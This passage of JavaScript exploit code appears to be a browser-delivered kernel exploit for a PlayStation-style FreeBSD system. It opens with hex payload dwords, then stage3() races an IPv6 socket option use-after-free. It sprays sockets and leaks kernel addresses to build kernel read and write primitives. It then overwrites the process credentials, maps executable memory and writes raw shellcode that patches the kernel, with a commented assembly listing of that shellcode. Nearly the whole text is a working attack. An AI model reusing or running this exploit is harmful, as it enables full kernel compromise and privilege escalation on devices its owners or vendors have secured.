  payload_writer[5738] = 0x62696c00;
  payload_writer[5739] = 0x4c656353;
  payload_writer[5740] = 0x49636269;
  payload_writer[5741] = 0x7265746e;
  payload_writer[5742] = 0x2e6c616e;
  payload_writer[5743] = 0x78727073;
  payload_writer[5744] = 0x6c616d00;
  payload_writer[5745] = 0x00636f6c;
  payload_writer[5746] = 0x65657266;
  payload_writer[5747] = 0x6c616300;
  payload_writer[5748] = 0x00636f6c;
  payload_writer[5749] = 0x6c616572;
  payload_writer[5750] = 0x00636f6c;
  payload_writer[5751] = 0x616d656d;
  payload_writer[5752] = 0x6e67696c;
  payload_writer[5753] = 0x6d656d00;
  payload_writer[5754] = 0x00746573;
  payload_writer[5755] = 0x636d656d;
  payload_writer[5756] = 0x6d007970;
  payload_writer[5757] = 0x6d636d65;
  payload_writer[5758] = 0x74730070;
  payload_writer[5759] = 0x79706372;
  payload_writer[5760] = 0x72747300;
  payload_writer[5761] = 0x7970636e;
  payload_writer[5762] = 0x72747300;
  payload_writer[5763] = 0x00746163;
  payload_writer[5764] = 0x6e727473;
  payload_writer[5765] = 0x00746163;
  payload_writer[5766] = 0x6c727473;
  payload_writer[5767] = 0x73006e65;
  payload_writer[5768] = 0x6d637274;
  payload_writer[5769] = 0x74730070;
  payload_writer[5770] = 0x6d636e72;
  payload_writer[5771] = 0x70730070;
  payload_writer[5772] = 0x746e6972;
  payload_writer[5773] = 0x6e730066;
  payload_writer[5774] = 0x6e697270;
  payload_writer[5775] = 0x73006674;
  payload_writer[5776] = 0x6e616373;
  payload_writer[5777] = 0x74730066;
  payload_writer[5778] = 0x72686372;
  payload_writer[5779] = 0x72747300;
  payload_writer[5780] = 0x72686372;
  payload_writer[5781] = 0x72747300;
  payload_writer[5782] = 0x00727473;
  payload_writer[5783] = 0x64727473;
  payload_writer[5784] = 0x72007075;
  payload_writer[5785] = 0x65646e69;
  payload_writer[5786] = 0x73690078;
  payload_writer[5787] = 0x69676964;
  payload_writer[5788] = 0x74610074;
  payload_writer[5789] = 0x7300696f;
  payload_writer[5790] = 0x636c7274;
  payload_writer[5791] = 0x73007970;
  payload_writer[5792] = 0x72657274;
  payload_writer[5793] = 0x00726f72;
  payload_writer[5794] = 0x7465475f;
  payload_writer[5795] = 0x79746370;
  payload_writer[5796] = 0x5f006570;
  payload_writer[5797] = 0x756f7453;
  payload_writer[5798] = 0x6362006c;
  payload_writer[5799] = 0x0079706f;
  payload_writer[5800] = 0x6e617273;
  payload_writer[5801] = 0x73610064;
  payload_writer[5802] = 0x6d697463;
  payload_writer[5803] = 0x73610065;
  payload_writer[5804] = 0x6d697463;
  payload_writer[5805] = 0x00725f65;
  payload_writer[5806] = 0x69746d67;
  payload_writer[5807] = 0x6700656d;
  payload_writer[5808] = 0x6d69746d;
  payload_writer[5809] = 0x00735f65;
  payload_writer[5810] = 0x61636f6c;
  payload_writer[5811] = 0x6d69746c;
  payload_writer[5812] = 0x6f6c0065;
  payload_writer[5813] = 0x746c6163;
  payload_writer[5814] = 0x5f656d69;
  payload_writer[5815] = 0x6b6d0072;
  payload_writer[5816] = 0x656d6974;
  payload_writer[5817] = 0x65706f00;
  payload_writer[5818] = 0x7269646e;
  payload_writer[5819] = 0x61657200;
  payload_writer[5820] = 0x72696464;
  payload_writer[5821] = 0x61657200;
  payload_writer[5822] = 0x72696464;
  payload_writer[5823] = 0x7400725f;
  payload_writer[5824] = 0x646c6c65;
  payload_writer[5825] = 0x73007269;
  payload_writer[5826] = 0x646b6565;
  payload_writer[5827] = 0x72007269;
  payload_writer[5828] = 0x6e697765;
  payload_writer[5829] = 0x72696464;
  payload_writer[5830] = 0x6f6c6300;
  payload_writer[5831] = 0x69646573;
  payload_writer[5832] = 0x69640072;
  payload_writer[5833] = 0x00646672;
  payload_writer[5834] = 0x70746567;
  payload_writer[5835] = 0x6e676f72;
  payload_writer[5836] = 0x00656d61;
  payload_writer[5837] = 0x65706f66;
  payload_writer[5838] = 0x7266006e;
  payload_writer[5839] = 0x00646165;
  payload_writer[5840] = 0x69727766;
  payload_writer[5841] = 0x66006574;
  payload_writer[5842] = 0x6b656573;
  payload_writer[5843] = 0x65746600;
  payload_writer[5844] = 0x66006c6c;
  payload_writer[5845] = 0x736f6c63;
  payload_writer[5846] = 0x70660065;
  payload_writer[5847] = 0x746e6972;
  payload_writer[5848] = 0x00000066;




	chain.call(payload_buffer);
	/*
    var loader_thr = chain.spawn_thread("loader_thr", function (new_thr) {
      new_thr.push(payload_buffer);
      new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);
    });
    loader_thr();
  */
}

function stage3() {

  const AF_INET6 = 28;
  const SOCK_DGRAM = 2;
  const IPPROTO_UDP = 17;
  const IPPROTO_IPV6 = 41;
  const IPV6_TCLASS = 61;
  const IPV6_2292PKTOPTIONS = 25;
  const IPV6_RTHDR = 51;
  const IPV6_PKTINFO = 46;

  const SPRAY_TCLASS = 0x53;
  const TAINT_CLASS = 0x58;
  const TCLASS_MASTER = 0x2AFE0000;

  const PKTOPTS_PKTINFO_OFFSET = 0x10;
  const PKTOPTS_RTHDR_OFFSET = 0x68;
  const PKTOPTS_TCLASS_OFFSET = 0xB0;

  const PROC_UCRED_OFFSET = 0x40;
  const PROC_FILEDESC_OFFSET = 0x48;
  const PROC_PID_OFFSET = 0xB0;


  const FILE_FOPS_OFFSET = 0x8;
  const FILEOPS_IOCTL_OFFSET = 0x18;
  const VM_MAP_PMAP_OFFSET = 0x120;

  const KERNEL_M_IP6OPT_OFFSET = 0x1A7AEA0;
  const KERNEL_MALLOC_OFFSET = 0x301840;
  const KERNEL_ALLPROC_OFFSET = 0x1B48318;
  const KERNEL_PMAP_STORE_OFFSET = 0x22C5268;

  const NUM_SPRAY_SOCKS = 200;
  const NUM_LEAK_SOCKS = 200;
  const NUM_SLAVE_SOCKS = 300;

  const size_of_triggered = 0x8;
  const size_of_valid_pktopts = 0x18;
  const size_of_size_of_tclass = 0x8;
  const size_of_master_main_tclass = 0x8;
  const size_of_master_thr1_tclass = 0x8;
  const size_of_master_thr2_tclass = 0x8;
  const size_of_spray_tclass = 0x8;
  const size_of_taint_tclass = 0x8;
  const size_of_tmp_tclass = 0x8;
  const size_of_rthdr_buffer = 0x800;
  const size_of_ptr_size_of_rthdr_buffer= 0x8;
  const size_of_spray_socks = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_leak_socks = 0x4 * NUM_LEAK_SOCKS;
  const size_of_slave_socks = 0x4 * NUM_SLAVE_SOCKS;
  const size_of_spray_socks_tclasses = 0x4 * NUM_SPRAY_SOCKS;
  const size_of_pktinfo_buffer = 0x18;
  const size_of_pktinfo_buffer_len = 0x8;
  const size_of_find_slave_buffer = 0x8 * NUM_SLAVE_SOCKS + 0x10;
  const size_of_fake_socketops = 0x58;
  const size_of_loop_counter = 0x8;
  const size_of_fix_these_sockets = 0x4 * (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2) + 0x18;
  const var_memory = p.malloc(size_of_triggered + size_of_valid_pktopts + size_of_size_of_tclass + size_of_master_main_tclass + size_of_master_thr1_tclass + size_of_master_thr2_tclass + size_of_spray_tclass + size_of_taint_tclass + size_of_tmp_tclass +
    size_of_rthdr_buffer + size_of_ptr_size_of_rthdr_buffer+ size_of_spray_socks + size_of_leak_socks + size_of_slave_socks + size_of_spray_socks_tclasses + size_of_pktinfo_buffer + size_of_pktinfo_buffer_len + size_of_find_slave_buffer + size_of_fake_socketops + size_of_loop_counter +
    size_of_fix_these_sockets
  );

  const triggered = var_memory;
  const valid_pktopts = triggered.add32(size_of_triggered);
  const size_of_tclass = valid_pktopts.add32(size_of_valid_pktopts);
  const master_main_tclass = size_of_tclass.add32(size_of_size_of_tclass);
  const master_thr1_tclass = master_main_tclass.add32(size_of_master_main_tclass);
  const master_thr2_tclass = master_thr1_tclass.add32(size_of_master_thr1_tclass);
  const spray_tclass = master_thr2_tclass.add32(size_of_master_thr2_tclass);
  const taint_tclass = spray_tclass.add32(size_of_spray_tclass);
  const tmp_tclass = taint_tclass.add32(size_of_taint_tclass);
  const rthdr_buffer = tmp_tclass.add32(size_of_tmp_tclass);
  const ptr_size_of_rthdr_buffer = rthdr_buffer.add32(size_of_rthdr_buffer);
  const spray_sockets_ptr = ptr_size_of_rthdr_buffer.add32(size_of_ptr_size_of_rthdr_buffer);
  const leak_sockets_ptr = spray_sockets_ptr.add32(size_of_spray_socks);
  const slave_sockets_ptr = leak_sockets_ptr.add32(size_of_leak_socks);
  const spray_socks_tclasses_ptr = slave_sockets_ptr.add32(size_of_slave_socks);
  const pktinfo_buffer = spray_socks_tclasses_ptr.add32(size_of_spray_socks_tclasses);
  const pktinfo_buffer_len = pktinfo_buffer.add32(size_of_pktinfo_buffer);
  const find_slave_buffer = pktinfo_buffer_len.add32(size_of_pktinfo_buffer_len);
  const fake_socketops = find_slave_buffer.add32(size_of_find_slave_buffer);
  const loop_counter = fake_socketops.add32(size_of_fake_socketops);
  const fix_these_sockets_ptr = loop_counter.add32(size_of_loop_counter);

  var overlapped_socket = -1;
  var overlapped_socket_idx = -1;

  var slave_socket = -1;

  var leaked_pktopts_address = 0;

  var target_file;
  var socketops;
  var kernel_base;

  p.write8(valid_pktopts.add32(0x0), 0x14);
  p.write4(valid_pktopts.add32(0x8), IPPROTO_IPV6);
  p.write4(valid_pktopts.add32(0xC), IPV6_TCLASS);
  p.write4(valid_pktopts.add32(0x10), 0x0);

  p.write8(size_of_tclass, 0x4);
  p.write8(spray_tclass, SPRAY_TCLASS);

  p.write8(master_main_tclass, 0x0);
  p.write8(master_thr1_tclass, 0x0);
  p.write8(master_thr2_tclass, 0x0);

  p.write8(taint_tclass, TAINT_CLASS);
  p.write8(tmp_tclass, 0x10);

  p.write8(pktinfo_buffer_len, 0x14);

  //create sockets
  const master_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const target_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;
  const spare_socket = chain.syscall(97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP).low;

  const this_pid = chain.syscall(20).low;

  {

    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(spray_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(leak_sockets_ptr.add32(0x4 * i));
    }
    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      chain.fcall(window.syscalls[97], AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
      chain.write_result4(slave_sockets_ptr.add32(0x4 * i));
    }
  }
  chain.run();

  const spray_sockets = p.array_from_address(spray_sockets_ptr, NUM_SPRAY_SOCKS);
  const spray_socks_tclasses = p.array_from_address(spray_socks_tclasses_ptr, NUM_SPRAY_SOCKS);

  const leak_sockets = p.array_from_address(leak_sockets_ptr, NUM_LEAK_SOCKS);
  const slave_sockets = p.array_from_address(slave_sockets_ptr, NUM_SLAVE_SOCKS);

  const fix_me = p.array_from_address(fix_these_sockets_ptr, NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x2);

  for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
    fix_me[i] = spray_sockets[i];
  }
  for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
    fix_me[i + NUM_SPRAY_SOCKS] = leak_sockets[i];
  }
  for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
    fix_me[i + (NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS)] = slave_sockets[i];
  }

  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x0] = master_socket;
  fix_me[NUM_SPRAY_SOCKS + NUM_LEAK_SOCKS + NUM_SLAVE_SOCKS + 0x1] = spare_socket;

  for (var i = 0; i < 10; i++) {
    p.write8(fake_socketops.add32(i * 0x8), window.gadgets["ret"]);
  }
  p.write8(fake_socketops.add32(0x50), 1);

  var thr1_start;
  var thr1_ctrl;
  const thread1 = chain.spawn_thread("thread1", function (new_thr) {
    const loop_start = new_thr.get_rsp();
    const trigger_condition = new_thr.create_equal_branch(triggered, 1);

    const triggered_false = new_thr.get_rsp();
    new_thr.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr1_tclass, size_of_tclass);
    const overlap_condition = new_thr.create_equal_branch(master_thr1_tclass, SPRAY_TCLASS);

    const overlap_false = new_thr.get_rsp();
    new_thr.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    new_thr.push(window.gadgets["pop rdi"]);
    var dest_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["pop rsi"]);
    var src_idx = new_thr.pushSymbolic();
    new_thr.push(window.gadgets["mov [rdi], rsi"]);
    var l1 = new_thr.get_rsp();
    new_thr.push(window.gadgets["pop rsp"]);
    var l2 = new_thr.get_rsp();
    new_thr.push(0x43434343);

    new_thr.finalizeSymbolic(dest_idx, l2);
    new_thr.finalizeSymbolic(src_idx, l1);
    thr1_start = loop_start;
    thr1_ctrl = l2;

    const overlap_true = new_thr.get_rsp();
    new_thr.push_write8(triggered, 1);

    const triggered_true = new_thr.get_rsp();
    new_thr.fcall(libKernelBase.add32(OFFSET_lk_pthread_exit), 0);

    new_thr.set_branch_points(trigger_condition, triggered_true, triggered_false);
    new_thr.set_branch_points(overlap_condition, overlap_true, overlap_false);
  });

  //boys dont race too fast now, kthx.
  var me = chain.call(libKernelBase.add32(OFFSET_lk_pthread_self));
  var prio = p.malloc(0x8);
  p.write4(prio, 0x100);
  var r = chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);

  const thread3 = new rop(); {
    //main loop
    const loop_start = thread3.get_rsp();
    //set valid.
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, valid_pktopts, size_of_valid_pktopts);
    //make thr1 give it a go
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_thr2_tclass, size_of_tclass);
    thread3.syscall_safe(105, master_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_tclass, 4);
    }
    thread3.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, master_main_tclass, size_of_tclass);
    const overlap_condition = thread3.create_equal_branch(master_main_tclass, SPRAY_TCLASS);
    const overlap_false = thread3.get_rsp();
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.syscall_safe(105, spray_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
    }
    thread3.jmp_rsp(loop_start);
    const overlap_true = thread3.get_rsp();
    thread3.push_write8(triggered, 1);
    thread3.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_TCLASS, taint_tclass, 4);
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      thread3.fcall(syscalls[118], spray_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, spray_socks_tclasses_ptr.add32(0x4 * i), size_of_tclass);
    }
    //make sure the thread will exit(?)
    thread3.push_write8(thr1_ctrl, thr1_start);
    thread3.set_branch_points(overlap_condition, overlap_true, overlap_false);
  }
  //trigger uaf
  thread1();
  thread3.run();

  function find_socket_overlap() {
    for (var i = 0; i < NUM_SPRAY_SOCKS; i++) {
      if (spray_socks_tclasses[i] == TAINT_CLASS) {
        overlapped_socket = spray_sockets[i];
        overlapped_socket_idx = i;
        return;
      }
    }
    alert("[ERROR] -> failed to find socket overlap. (should be unreachable)");
    while (1) {};
  }

  function fake_pktopts(pktinfo) {
    {

      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, 0x100);
      chain.push_write8(rthdr_buffer.add32(0x0), 0x0F001E00);
      chain.push_write8(rthdr_buffer.add32(PKTOPTS_PKTINFO_OFFSET), pktinfo);
      chain.push_write8(loop_counter, 0);
      chain.push_write8(tmp_tclass, 0x1);
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        chain.fcall(syscalls[105], leak_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
      chain.fcall(window.syscalls[105], overlapped_socket, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);

      const loop_start = chain.get_rsp();
      const loop_condition = chain.create_equal_branch(loop_counter, 0x100);

      const loop_condition_false = chain.get_rsp();
      for (var i = 0; i < NUM_LEAK_SOCKS; i++) {
        chain.push_write8(rthdr_buffer.add32(PKTOPTS_TCLASS_OFFSET), (TCLASS_MASTER | i));
        chain.syscall_safe(105, leak_sockets[i], IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, 0xF8);
      }
      chain.syscall_safe(118, master_socket, IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, size_of_tclass);
      const overlap_condition = chain.create_greater_or_equal_branch(tmp_tclass, TCLASS_MASTER);

      const overlap_false = chain.get_rsp();
      chain.push(window.gadgets["pop rax"]);
      chain.push(loop_counter);
      chain.push(window.gadgets["inc dword [rax]"]);
      chain.jmp_rsp(loop_start);

      const loop_condition_true = chain.get_rsp();
      const overlap_true = chain.get_rsp();

      chain.set_branch_points(loop_condition, loop_condition_true, loop_condition_false);
      chain.set_branch_points(overlap_condition, overlap_true, overlap_false);
    }
    chain.run();

    const tclass = p.read4(tmp_tclass);
    if ((tclass & 0xFFFF0000) == TCLASS_MASTER) {
      overlapped_socket_idx = (tclass & 0x0000FFFF);
      overlapped_socket = leak_sockets[overlapped_socket_idx];
      return;
    }
    alert("[ERROR] failed to find RTHDR <-> master socket overlap");
    while (1) {};

  }

  function leak_rthdr_address(size) {
    const ip6r_len = ((size >> 3) - 1 & ~1);
    const ip6r_segleft = (ip6r_len >> 1);
    const header = (ip6r_len << 8) + (ip6r_segleft << 24); {
      chain.fcall(libSceLibcInternalBase.add32(OFFSET_libcint_memset), rthdr_buffer, 0x0, size);
      chain.push_write8(rthdr_buffer, header);
      chain.push_write8(ptr_size_of_rthdr_buffer, size);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ((ip6r_len + 1) << 3));
      chain.fcall(syscalls[118], overlapped_socket, IPPROTO_IPV6, IPV6_RTHDR, rthdr_buffer, ptr_size_of_rthdr_buffer);
    }
    chain.run();
    const kaddress = p.read8(rthdr_buffer.add32(PKTOPTS_RTHDR_OFFSET));
    return kaddress;
  }

  function leak_pktopts() {
    leaked_pktopts_address = leak_rthdr_address(0x100); {
      chain.push_write8(tmp_tclass, 0x10);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_RTHDR, 0, 0);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[105], slave_sockets[i], IPPROTO_IPV6, IPV6_TCLASS, tmp_tclass, 4);
      }
    }
    chain.run();
  }

  function find_slave() {
    {
      chain.push_write8(pktinfo_buffer, leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
        chain.fcall(syscalls[118], slave_sockets[i], IPPROTO_IPV6, IPV6_PKTINFO, find_slave_buffer.add32(0x8 * i), pktinfo_buffer_len);
      }
    }
    chain.run();

    for (var i = 0; i < NUM_SLAVE_SOCKS; i++) {
      if (p.read4(find_slave_buffer.add32(0x8 * i)) == (leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET)).low) {
        slave_socket = slave_sockets[i];
        return;
      }
    }
    alert("[ERROR] failed to find slave");
    while (1) {};
  }

  function kernel_read8(address) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len)
    }
    chain.run();
    return p.read8(pktinfo_buffer);
  }

  function kernel_write8(address, value) {
    {
      chain.push_write8(pktinfo_buffer, address);
      chain.push_write8(pktinfo_buffer.add32(0x8), 0);
      chain.push_write8(pktinfo_buffer.add32(0x10), 0);
      chain.fcall(syscalls[105], master_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
      chain.fcall(syscalls[118], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, pktinfo_buffer_len);
      chain.push_write8(pktinfo_buffer, value);
      chain.fcall(syscalls[105], slave_socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buffer, 0x14);
    }
    chain.run();
  }

  function brute_force_kernel_map() {
    var attempt = new int64(((leaked_pktopts_address.low & 0xFE000000) + VM_MAP_PMAP_OFFSET), leaked_pktopts_address.hi);
    for (var i = 0; i < 0xC0; i++) {
      var kernel_pmap_store = kernel_read8(attempt);
      if (kernel_pmap_store.hi == 0xFFFFFFFF && ((kernel_pmap_store.low & 0x3FFF) == (KERNEL_PMAP_STORE_OFFSET & 0x3FFF))) {
        kernel_base = kernel_pmap_store.sub32(KERNEL_PMAP_STORE_OFFSET);
        if ((kernel_base.low & 0x3FFF) == 0x0) {
          return;
        }
      }
      attempt.sub32inplace(0x01000000);
    }
    alert("[ERROR] failed to find kernel_map");
    while (1) {};
  }

  function find_proc() {
    var proc = kernel_read8(kernel_base.add32(KERNEL_ALLPROC_OFFSET));
    while (proc.low != 0) {
      var pid = kernel_read8(proc.add32(PROC_PID_OFFSET));
      if (pid.low == this_pid) {
        return proc;
      }
      proc = kernel_read8(proc);
    }
    alert("[ERROR] failed to find proc");
    while (1) {};
  }

  function find_execution_socket() {

    var filedesc = kernel_read8(proc.add32(PROC_FILEDESC_OFFSET));
    var ofiles = kernel_read8(filedesc);
    target_file = kernel_read8(ofiles.add32(0x8 * target_socket))
    socketops = kernel_read8(target_file.add32(FILE_FOPS_OFFSET));
  }
  //lower priority
  p.write4(prio, 0x1FF);
  chain.call(libKernelBase.add32(OFFSET_lk_pthread_setschedparam), me, 1, prio);
  //find uaf
  find_socket_overlap();
  //play with uaf
  fake_pktopts(0);
  leak_sockets[overlapped_socket_idx] = spare_socket;
  //leak shit
  leak_pktopts();
  fake_pktopts(leaked_pktopts_address.add32(PKTOPTS_PKTINFO_OFFSET));
  //find vvictim
  find_slave();
  brute_force_kernel_map();
  const proc = find_proc();
  const proc_ucred = kernel_read8(proc.add32(PROC_UCRED_OFFSET));
  kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF));

  find_execution_socket();
  var exec_handle = chain.syscall(533, 0, 0x100000, 7);
  var write_handle = chain.syscall(534, exec_handle, 3);
  var write_address = chain.syscall(477, new int64(0x91000000, 0x9), 0x100000, 3, 17, write_handle, 0);
  var exec_address = chain.syscall(477, new int64(0x90000000, 0x9), 0x100000, 0x5, 1, exec_handle, 0)
  chain.syscall(324, 1);
  if(exec_address.low != 0x90000000) {
      alert("[ERROR] failed to allocate jit memory");
      while(1){};
  }
  var exec_writer = p.array_from_address(write_address, 0x4000);
  for(var i = 0; i < 0x200; i++) {
      exec_writer[i] = 0x90909090;
  }
  exec_writer[0x200] = 0x37C0C748;
  exec_writer[0x201] = 0xC3000013;
  if(chain.call(exec_address).low != 0x1337) {
      alert("[ERROR] hmm weird");
      while(1){};
  }

  exec_writer[0] = 0x54415355;
  exec_writer[1] = 0x1111BB48;
  exec_writer[2] = 0x11111111;
  exec_writer[3] = 0xBD481111;
  exec_writer[4] = 0x22222222;
  exec_writer[5] = 0x22222222;
  exec_writer[6] = 0xBFE4314D;
  exec_writer[7] = 0x000000C0;
  exec_writer[8] = 0xBADE8948;
  exec_writer[9] = 0x00000002;
  exec_writer[10] = 0x8349D5FF;
  exec_writer[11] = 0x814901C4;
  exec_writer[12] = 0x000500FC;
  exec_writer[13] = 0x41E47500;
  exec_writer[14] = 0x655D5B5C;
  exec_writer[15] = 0x25048B48;
  exec_writer[16] = 0x00000000;
  exec_writer[17] = 0x08408B48;
  exec_writer[18] = 0x48408B48;
  exec_writer[19] = 0x48008B48;
  exec_writer[20] = 0x333333B9;
  exec_writer[21] = 0x33333333;
  exec_writer[22] = 0xC7C74833;
  exec_writer[23] = 0x000002BE; // num sockets
  exec_writer[24] = 0x48F63148;
  exec_writer[25] = 0x117DFE39;
  exec_writer[26] = 0x48B1148B;
  exec_writer[27] = 0x00D004C7;
  exec_writer[28] = 0x48000000;
  exec_writer[29] = 0xEB01C683;
  exec_writer[30] = 0x44BF48EA;
  exec_writer[31] = 0x44444444;
  exec_writer[32] = 0x48444444;
  exec_writer[33] = 0x555555BE;
  exec_writer[34] = 0x55555555;
  exec_writer[35] = 0x37894855;
  exec_writer[36] = 0x6666BF48;
  exec_writer[37] = 0x66666666;
  exec_writer[38] = 0x200F6666;
  exec_writer[39] = 0xFF2548C0;
  exec_writer[40] = 0x0FFFFEFF;
  exec_writer[41] = 0x87C6C022;
  exec_writer[42] = 0x0063A160;
  exec_writer[43] = 0xC087C7C3;
  exec_writer[44] = 0x480063AC;
  exec_writer[45] = 0xC7C3C031;
  exec_writer[46] = 0x639F1087;
  exec_writer[47] = 0xC0314800;
  exec_writer[48] = 0xE087C7C3;
  exec_writer[49] = 0x480063A6;
  exec_writer[50] = 0xC6C3C031;
  exec_writer[51] = 0x67B5C087;
  exec_writer[52] = 0xBE480002;
  exec_writer[53] = 0x90909090;
  exec_writer[54] = 0x8B499090;
  exec_writer[55] = 0x08B78948;
  exec_writer[56] = 0xC700264C;
  exec_writer[57] = 0x087B7087;
  exec_writer[58] = 0x0000B800;
  exec_writer[59] = 0x9087C700;
  exec_writer[60] = 0x00000004;
  exec_writer[61] = 0x66000000;
  exec_writer[62] = 0x04B987C7;
  exec_writer[63] = 0x90900000;
  exec_writer[64] = 0xBD87C766;
  exec_writer[65] = 0x90000004;
  exec_writer[66] = 0x87C76690;
  exec_writer[67] = 0x000004C6;
  exec_writer[68] = 0x87C6E990;
  exec_writer[69] = 0x001D2336;
  exec_writer[70] = 0x3987C637;
  exec_writer[71] = 0x37001D23;
  exec_writer[72] = 0xC187C766;
  exec_writer[73] = 0x9000094E;
  exec_writer[74] = 0x87C766E9;
  exec_writer[75] = 0x0009547B;
  exec_writer[76] = 0x87C7E990;
  exec_writer[77] = 0x002F2C20;
  exec_writer[78] = 0xC3C03148;
  exec_writer[79] = 0x7087C748;
  exec_writer[80] = 0x02011258;
  exec_writer[81] = 0x48000000;
  exec_writer[82] = 0xB192B78D;
  exec_writer[83] = 0x89480006;
  exec_writer[84] = 0x125878B7;
  exec_writer[85] = 0x9C87C701;
  exec_writer[86] = 0x01011258;
  exec_writer[87] = 0x48000000;
  exec_writer[88] = 0x0100000D;
  exec_writer[89] = 0xC0220F00;
  exec_writer[90] = 0x8080B848;
  exec_writer[91] = 0x80808080;
  exec_writer[92] = 0x90C38080;

  p.write8(write_address.add32(0x6), kernel_base.add32(KERNEL_M_IP6OPT_OFFSET));
  p.write8(write_address.add32(0x10), kernel_base.add32(KERNEL_MALLOC_OFFSET));
  p.write8(write_address.add32(0x51), fix_these_sockets_ptr);

  p.write8(write_address.add32(0x7B), target_file.add32(FILE_FOPS_OFFSET));
  p.write8(write_address.add32(0x85), socketops);
  p.write8(write_address.add32(0x92), kernel_base);

  p.write8(fake_socketops.add32(FILEOPS_IOCTL_OFFSET), exec_address);
  kernel_write8(target_file.add32(FILE_FOPS_OFFSET), fake_socketops);
  chain.syscall(54, target_socket, 0x20001111, 0);
  //alert("executed in kernel");
  //p.write8(0, 0);
}
/*
    - assemble & take every 4 bytes, byteswap and assign them to exec_writer
    - overwrite dynamic stuff after
*/
/*
//spam malloc, this should not be required anymore
push rbp
push rbx
push r12  

mov rbx, 0x1111111111111111
mov rbp, 0x2222222222222222
xor r12, r12

kmalloc_loop:
	mov edi, 0xC0
  mov rsi, rbx
	mov edx, 2
  call rbp
	add r12, 0x1
  cmp r12, 0x500
  jne kmalloc_loop

pop r12
pop rbx
pop rbp

//kill all of our socket file*'s just in case
//get thr pointer
mov rax, qword ptr gs:[0x0]
//get proc pointer
mov rax, qword ptr [rax + 0x8]
//get filedesc pointer
mov rax, qword ptr [rax + 0x48]
//get file pointer pointer
mov rax, qword ptr [rax + 0x0]

mov rcx, 0x3333333333333333
mov rdi, 0x2BE
xor rsi, rsi
loop_check:
  cmp rsi, rdi
  jge end
  mov edx, dword ptr [rcx + 0x4 * rsi]
  mov qword ptr [rax + rdx * 0x8], 0x0
  add rsi, 0x1
  jmp loop_check

end:

//socketops field pointer
mov rdi, 0x4444444444444444
//original socketops pointer
mov rsi, 0x5555555555555555 
mov qword ptr [rdi], rsi
//kernel base
mov rdi, 0x6666666666666666 

